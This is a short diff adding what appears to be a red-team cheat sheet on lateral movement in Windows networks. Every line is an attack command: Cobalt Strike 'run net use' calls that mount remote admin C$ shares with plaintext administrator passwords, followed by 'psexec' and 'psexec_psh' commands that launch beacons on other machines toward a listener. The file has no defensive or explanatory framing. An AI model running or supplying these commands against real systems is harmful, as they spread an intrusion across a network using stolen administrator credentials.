@@ -1,0 +1,13 @@
+LATERAL MOVEMENT
+SharpCom
+
+run net use \\computername\c$ P@ssw0rd  /U:computername\administrator
+
+psexec <computername> <listener>
+
+From cobalt strike
+
+run net use \\Server_Name\C$ /user:wsadmin "Workstationadmin1!"
+
+psexec_psh <computer_name> <listener>
+
